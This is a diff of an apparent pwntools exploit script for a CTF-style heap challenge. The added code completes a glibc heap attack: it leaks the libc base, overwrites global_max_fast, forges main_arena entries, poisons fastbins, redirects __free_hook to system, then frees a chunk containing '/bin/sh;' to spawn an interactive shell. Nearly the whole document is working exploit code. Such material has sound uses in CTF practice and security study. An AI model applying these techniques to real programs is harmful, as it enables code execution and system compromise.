@@ -52,7 +52,7 @@ insert(0x20)	#2
 insert(8)	#3
 insert(8)	#4
 insert(0x90)	#5
-insert(0x90)	#6
+insert(0x90,data = "/bin/sh;")	#6
 merge(1,1)	#7
 buf = view(7,0x10)
 libc_base = u64(buf[:8])-(libc.sym['__malloc_hook']+0x20+88)
@@ -60,7 +60,7 @@ success("LIBC BASE -> %#x"%libc_base)
 
 update(7,0x10,'A'*0x8+p64(libc_base+global_max_fast-0x10))
 #stupid me write max_fast to bk_nextsize...now i've fixed it
-insert(0x80,data = 'A'*0x60+p64(0)+p64(0xa1)+p64(0)+p64(0xa1))	#1
+insert(0x80,data = 8*(p64(0)+p64(0xa1)))	#1
 delete(0)
 merge(2,2)	#0
 buf = view(0,8)
@@ -72,23 +72,27 @@ insert(0x18,data = p64(0)+p64(0xa1)+p64(0xa1))	#8
 update(0,0x40,p64(0)+p64(0xa1)+p64(0)+p64(0xa1)+p64(0)+p64(0xb1)+p64(0)+p64(0xb1))
 delete(1)
 update(8,0x18,p64(0)+p64(0xa1)+p64(0xb1))
-insert(0x90)	#1
+insert(0x90,data = 9*(p64(0)+p64(0xa1)))	#1
 info("EVIL FD of fast(size==0xa1) == 0xb1")
 update(8,0x10,p64(0)+p64(0xb1))
 delete(1)
 update(8,0x18,p64(0)+p64(0xb1)+p64(libc_base+libc.sym['__malloc_hook']+0x20+64))
-insert(0xa0)	#1
+insert(0xa0,data = 0xa*(p64(0)+p64(0xa1)))	#1
 
-fake_arena = p64(0)+p64(libc_base+libc.sym['__free_hook']-0x10)
+fake_arena = p64(0)+p64(libc_base+libc.sym['__free_hook']-0xb80)
 fake_arena += p64(0)
 for i in range(8):
 	fake_arena += p64(libc_base+0x3bf7b8+i*0x10)*2
 fake_arena += p64(libc_base+0x3bf7b8+0x80)
 insert(0xa0,data = fake_arena)
 info("Control main_arena.top but its fastfd is in need of recovery")
-'''
+update(8,0x10,p64(0)+p64(0xa1))
 delete(1)
-update(8,0x18,p64(0)+p64(0xb1)+p64(heap_base+0x80))
-insert(0xa0)	#1
-'''
+update(8,0x18,p64(0)+p64(0xa1)+p64(0))
+insert(0x90,9*(p64(0)+p64(0xa1)))
+for i in range(18):
+	insert(0x90,data = ''.ljust(0x90,'\0'))
+insert(0x38,data = 0x30*'\0'+p64(libc_base+libc.sym['system']))
+delete(6)
+
 io.interactive()
